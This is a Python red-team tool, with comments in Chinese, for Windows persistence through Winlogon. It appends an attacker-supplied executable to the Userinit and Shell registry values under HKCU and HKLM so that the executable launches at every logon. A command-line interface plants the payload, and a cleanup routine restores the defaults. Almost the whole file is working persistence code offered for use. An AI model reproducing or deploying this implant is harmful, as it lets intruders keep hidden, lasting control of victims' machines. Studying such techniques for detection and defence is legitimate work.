#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2020.02.06
# @Author  : Lhaihai
# @File    : winlogon_helper_dll
# @Software: PyCharm
# @Blog    : http://www.Lhaihai.top
"""
    Description : Winlogon是Windows组件，它处理各种活动，例如登录，注销，在身份验证期间加载用户配置文件，关闭，锁定屏幕等。这种行为由注册表管理，注册表定义了在Windows登录期间启动哪些进程。 从红队的角度来看，这些事件可以触发执行持久性的任意有效负载。
"""


import pyregedit.pyregedit as pyregedit
from logger import factory_logger
logger = factory_logger('winlogon_helper_dll')
import sys,os

def init():
    root = pyregedit.HKEY_CURRENT_USER
    path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    reg = pyregedit.RegEdit(root,path)
    return reg

def HKLM_init():
    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    reg = pyregedit.RegEdit(root,path)
    return reg

def set_Userinit(cmd):
    reg = init()
    if reg.check_key():
        try:
            reg.create_value('Userinit',pyregedit.REG_SZ,cmd)
            logger.info('Userinit 植入成功')
        except:
            logger.info('Userinit 植入失败')
    else:
        logger.error('winlogon 项不存在!')
        return

def set_Userinit_HKLM(cmd):
    reg = HKLM_init()
    if reg.check_key():
        try:
            value = reg.get_value('Userinit')
            reg.create_value('Userinit', pyregedit.REG_SZ, value[0]+cmd)
            logger.info('Userinit 植入成功')
        except Exception as e:
            logger.info('Userinit 植入失败'+str(e))
    else:
        logger.error('需要管理员权限!')
        return

def set_Shell(cmd):
    reg = init()
    if reg.check_key():
        try:
            reg.create_value('Shell',pyregedit.REG_SZ,cmd)
            logger.info('Shell 植入成功')
        except:
            logger.info('Shell 植入失败')
    else:
        logger.error('winlogon 项不存在!')
        return

def set_Shell_HKLM(cmd):
    reg = HKLM_init()
    if reg.check_key():
        try:
            value = reg.get_value('Shell')
            reg.create_value('Shell', pyregedit.REG_SZ, value[0]+','+cmd)
            logger.info('Shell 植入成功')
        except Exception as e:
            logger.info('Shell 植入失败'+str(e))
    else:
        logger.error('需要管理员权限!')
        return

def clear_HKCU():
    reg = init()
    if reg.check_key():
        try:
            reg.delete_value('Userinit')
            reg.delete_value('Shell')
            # reg.delete_value('Notify')
            logger.info('HKCU 清除成功')
        except:
            pass
    else:
        logger.error('winlogon 项不存在')
        return

def clear_HKLM():
    reg = HKLM_init()
    if reg.check_key():
        try:
            reg.create_value('Userinit',pyregedit.REG_SZ,r'C:\Windows\system32\userinit.exe,')
            reg.create_value('Shell',pyregedit.REG_SZ,r'explorer.exe')
            # reg.delete_value('Notify')
            logger.info('HKLM 清除成功')
        except:
            logger.info('HKLM 清除失败')
    else:
        logger.error('需要管理员权限！')
        return

if __name__ == '__main__':
    model = sys.argv[1] if len(sys.argv) > 1 else ''
    if model == 'shell':
        action = sys.argv[2]
        if action == 'set':
            cmd = sys.argv[3]
            # cmd = r'c:\64.exe'
            if ':' not in cmd and '\\' not in cmd:
                path = os.getcwd() + '\\' + cmd
                if os.path.exists(path):
                    set_Shell_HKLM(path)
                else:
                    logger.error(cmd + '文件不存在')
            else:
                set_Shell_HKLM(cmd)
    elif model == 'userinit':
        action = sys.argv[2]
        if action == 'set':
            cmd = sys.argv[3]
            # cmd = r'c:\64.exe'
            if ':' not in cmd and '\\' not in cmd:
                path = os.getcwd() + '\\' + cmd
                if os.path.exists(path):
                    set_Userinit_HKLM(path)
                else:
                    logger.error(cmd + '文件不存在')
            else:
                set_Userinit_HKLM(cmd)
    elif model == 'clear':
        clear_HKLM()
    else:
        print('winlogon_helper_dll_64.exe shell set 64.exe')
        print('winlogon_helper_dll_64.exe userinit set 64.exe')
        print('winlogon_helper_dll_64.exe clear')
